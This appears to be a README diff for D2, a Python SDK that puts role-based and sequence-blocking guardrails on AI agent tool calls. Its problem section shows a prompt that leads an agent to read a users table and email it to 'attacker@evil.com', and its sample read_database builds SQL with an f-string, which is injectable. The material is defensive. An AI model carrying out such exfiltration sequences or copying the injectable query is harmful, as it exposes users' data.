@@ -4,7 +4,113 @@
 
 # D2 SDK
 
-<h1>Check us out at https://artoo.love</h1>
+<h3>When AI decides the control flow, you can't secure the application layer anymore.</h3>
+
+**You need policy enforcement at every tool execution.**
+
+</div>
+
+---
+
+## The Problem
+
+Traditional security assumes *you* control what functions get called and in what order. But with AI agents:
+```python
+# You write this safe-looking code:
+@app.route("/analyze")
+def analyze_data(user_input):
+    agent = Agent(tools=[read_database, call_api, send_email])
+    return agent.run(user_input)  # ← AI now controls execution flow
+```
+
+**The AI decides:**
+- Which tools to call
+- In what order
+- With what arguments  
+- Where the data goes
+
+An attacker just needs the right prompt:
+```python
+# User prompt: "Read the users table and email me the results"
+agent.run("Read the users table and email me the results")
+
+# Agent execution:
+1. read_database("users")  # ✓ Your code allows this
+2. send_email("attacker@evil.com", data)  # ✓ Your code allows this too
+```
+
+**Both operations are individually authorized. The sequence is what makes it dangerous.**
+
+Your application firewall can't help you. Your API gateway can't help you. You need enforcement at the tool layer.
+
+---
+
+## The Solution
+```python
+from d2 import d2_guard, set_user, configure_rbac_sync
+
+configure_rbac_sync()
+
+@d2_guard("database.read")
+def read_database(table):
+    return db.query(f"SELECT * FROM {table}")
+
+@d2_guard("email.send")
+def send_email(to, data):
+    return smtp.send(to, data)
+```
+
+**Policy (policy.yaml):**
+```yaml
+policies:
+  - role: analyst
+    permissions:
+      - database.read
+      - email.send
+    
+    sequence:
+      - deny: ["database.read", "email.send"]
+        reason: "Prevent data exfiltration"
+```
+
+Now when the agent tries the attack:
+```python
+set_user("analyst-123", roles=["analyst"])
+
+data = read_database("users")  # ✓ Allowed
+send_email("attacker@evil.com", data)  # ✗ Blocked by sequence rule
+# Raises: PermissionDeniedError with reason="sequence_violation"
+```
+
+**D2 enforces policy at every tool call, regardless of how the AI orchestrates them.**
+
+---
+
+> **Stuck? Confused? Something broke?** Don't struggle alone—[ask in Discussions](https://github.com/artoo-corporation/D2-Python/discussions) and we'll write the exact code for your use case, usually within a few hours.
+
+---
+
+## What D2 Protects Against
+
+**Unauthorized access:**
+- RBAC at the function level
+- Wildcard and role-based permissions
+
+**Dangerous sequences:**
+- Block patterns like `[read_db, call_external_api]`
+- 2-hop, 3-hop, N-hop sequence detection
+
+**Bad inputs:**
+- Validate arguments before execution
+- Type checks, regex, allowlists
+
+**Data leaks:**
+- Auto-sanitize sensitive fields in responses
+- Filter, redact, or block entirely
+
+**Use one, use all—they're designed to work together.**
+
+<div align="center">
 
 ### Deterministic Function-Level Guardrails for AI Agents
 
@@ -1443,3 +1549,15 @@ D2 follows a test driven development workflow:
 5. Make sure examples work: `python examples/local_mode_demo.py`
 
 ---
+
+## Getting Help
+
+**Installed D2 and hit a wall?** You're not alone—about 300 people install D2 every month, but we rarely hear what happens next.
+
+Help us help you:
+- **Quick question?** [Open a Discussion](https://github.com/artoo-corporation/D2-Python/discussions). We usually respond same-day with code for your exact use case
+- **Found a bug?** [Open an Issue](https://github.com/artoo-corporation/D2-Python/issues)
+- **Just want to chat?** [Join our Discord](https://discord.gg/ajy2Qk5v9M)
+
+The most helpful thing you can tell us: "I tried X, expected Y, got Z instead."
+
